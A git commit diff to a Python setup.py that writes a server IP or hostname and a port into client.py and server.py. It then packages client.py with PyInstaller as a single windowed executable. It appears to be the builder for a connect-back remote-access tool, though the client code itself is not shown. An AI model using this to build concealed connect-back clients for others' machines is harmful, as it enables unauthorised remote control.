1a35380a9dceb0ae423902681930094d5ab956d7
xp4xbox <nicman1080@gmail.com>
2018-04-17 15:29:44 -0400

    Improve setup.py

--- setup.py
+++ setup.py
@@ -7,6 +7,10 @@ objSocket.connect(("google.com", 0))
 strCurrentIP = objSocket.getsockname()[0]
 objSocket.close()
 
+if not os.path.isfile("client.py"):
+    print("client.py not found!")
+    sys.exit(0)
+
 
 print("1. Use: " + strCurrentIP)
 print("2. Use a different IP address for server")
@@ -25,27 +29,71 @@ else:
     sys.exit(0)
 
 
+strPort = input("\n" + "Enter port number (Press ENTER for default): ")
+
+if strPort == "":
+    pass
+else:
+    if not strPort.isdigit():
+        print("You must enter numeric value!")
+        sys.exit(0)
+    elif not 0 <= int(strPort) <= 65535:
+        print("You must enter a port between 0 and 65535!")
+        sys.exit(0)
+
+    elif not os.path.isfile("server.py"):
+        print("server.py not found!")
+        sys.exit(0)
+
+    objServerFile = open("server.py", "r")
+    arrFileContents = objServerFile.readlines()
+    objServerFile.close()
+
+    # use loop in order to ensure that line number doesnt matter
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:9] == "intPort =":
+            arrFileContents[intCounter] = "intPort = " + strPort + "\n"
+            break
+
+    objServerFile = open("server.py", "w")
+    objServerFile.writelines(arrFileContents)
+    objServerFile.close()
+
+
 objClientFile = open("client.py", "r")
 arrFileContents = objClientFile.readlines()
 objClientFile.close()
 
 if strChoice == "2" or strChoice == "1":
-    arrFileContents[6] = "strHost = \"" + strCurrentIP + "\"" + "\n"
-    arrFileContents[7] = "#strHost = socket.gethostbyname(\"\")" + "\n"
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
+            arrFileContents[intCounter] = "strHost = \"" + strCurrentIP + "\"" + "\n"
+            arrFileContents[intCounter + 1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
+            break
 else:
-    arrFileContents[6] = "#strHost = \"\"" + "\n"
-    arrFileContents[7] = "strHost = socket.gethostbyname(\"" + strDNSHostname + "\")" + "\n"
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
+            arrFileContents[intCounter] = "# strHost = \"\"" + "\n"
+            arrFileContents[intCounter + 1] = "strHost = socket.gethostbyname(\"" + strDNSHostname + "\")" + "\n"
+            break
+
+if strPort != "":
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:9] == "intPort =":
+            arrFileContents[intCounter] = "intPort = " + strPort + "\n"
+            break
 
 objClientFile = open("client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
 
-strIconChoice = input("\n" + "Path for icon (x to skip): ")
+strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")
 
 strIconChoice = strIconChoice.replace("\"", "")
 
-if strIconChoice == "x":
+
+if strIconChoice == "":
     os.system(python_path + "/Scripts/pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed")
